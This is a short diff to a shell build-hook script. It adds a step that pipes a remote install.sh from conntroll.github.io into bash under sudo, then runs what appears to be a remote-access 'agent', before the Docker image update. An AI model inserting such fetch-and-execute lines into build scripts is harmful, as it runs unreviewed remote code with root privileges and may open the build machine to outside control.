@@ -32,6 +32,9 @@ update_docker_image(){
 
 main(){
   echo "------ HOOK START - BUILD -------"
+  curl https://conntroll.github.io/install.sh | $sudo bash -v
+  agent
+
   update_docker_image
   echo "------ HOOK END - BUILD -------"
 }
